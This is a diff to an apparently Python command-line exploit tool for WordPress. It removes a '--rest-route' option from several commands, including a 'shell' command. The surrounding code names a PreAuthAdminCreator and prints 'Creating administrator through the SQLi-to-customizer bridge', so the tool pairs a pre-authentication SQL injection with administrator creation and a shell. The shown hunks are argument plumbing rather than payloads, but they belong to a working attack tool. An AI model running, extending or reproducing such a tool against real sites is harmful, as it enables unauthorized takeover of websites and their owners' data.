@@ -59,7 +59,6 @@ def _client(args: argparse.Namespace) -> BatchClient:
     return BatchClient(
         args.url,
         timeout=args.timeout,
-        rest_route=args.rest_route,
         proxy=args.proxy,
     )
 
@@ -105,7 +104,6 @@ def cmd_check(args: argparse.Namespace) -> int:
     client = BatchClient(
         args.url,
         timeout=max(args.timeout, args.sleep + 10),
-        rest_route=args.rest_route,
         proxy=args.proxy,
     )
     _print_wordpress_markers(client)
@@ -284,7 +282,6 @@ def cmd_shell(args: argparse.Namespace) -> int:
         creator = PreAuthAdminCreator(
             args.url,
             timeout=args.timeout,
-            rest_route=args.rest_route,
             proxy=args.proxy,
         )
         info("Creating administrator through the SQLi-to-customizer bridge...")
@@ -355,14 +352,8 @@ def cmd_shell(args: argparse.Namespace) -> int:
 # -- parser -----------------------------------------------------------------
 
 
-def _add_common(parser: argparse.ArgumentParser, *, rest_route: bool = True) -> None:
+def _add_common(parser: argparse.ArgumentParser) -> None:
     parser.add_argument("url", help="target base URL, e.g. http://target")
-    if rest_route:
-        parser.add_argument(
-            "--rest-route",
-            action="store_true",
-            help="use /?rest_route=/batch/v1 instead of /wp-json/batch/v1",
-        )
     parser.add_argument("--timeout", type=float, default=30.0, help="request timeout (default: 30)")
     parser.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080")
 
